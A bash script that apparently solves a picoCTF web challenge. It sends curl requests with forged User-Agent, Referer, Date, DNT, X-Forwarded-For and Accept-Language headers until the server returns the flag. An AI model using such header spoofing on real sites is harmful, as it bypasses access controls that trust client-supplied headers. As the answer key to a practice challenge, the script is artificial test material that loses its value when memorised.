#!/bin/bash


echo "Step 1"
curl -A "the official PicoBrowser" http://mercury.picoctf.net:46199/ -vvv

echo "Step 2"
curl -A "the official PicoBrowser" -H "Referer:http://mercury.picoctf.net:46199/" http://mercury.picoctf.net:46199/ -vvv

echo "Step 3"
curl -A "the official PicoBrowser" -H "Referer:http://mercury.picoctf.net:46199/" -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" http://mercury.picoctf.net:46199/ -vvv

echo "Step 4"
curl -A "the official PicoBrowser" -H "Referer:http://mercury.picoctf.net:46199/" -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" http://mercury.picoctf.net:46199/ -vvv

echo "Step 5"
echo "2.56.31.1 is allocated by RIPE"
curl -A "the official PicoBrowser" -H "Referer:http://mercury.picoctf.net:46199/" -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.56.31.1" http://mercury.picoctf.net:46199/ -vvv

echo "Step 6"
curl -A "the official PicoBrowser" -H "Referer:http://mercury.picoctf.net:46199/" -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.56.31.1" -H "Accept-Language: sv" http://mercury.picoctf.net:46199/ -vvv

echo "Answer"
curl -sA "the official PicoBrowser" -H "Referer:http://mercury.picoctf.net:46199/" -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 2.56.31.1" -H "Accept-Language: sv" http://mercury.picoctf.net:46199/ | grep -o "picoCTF{.*}"
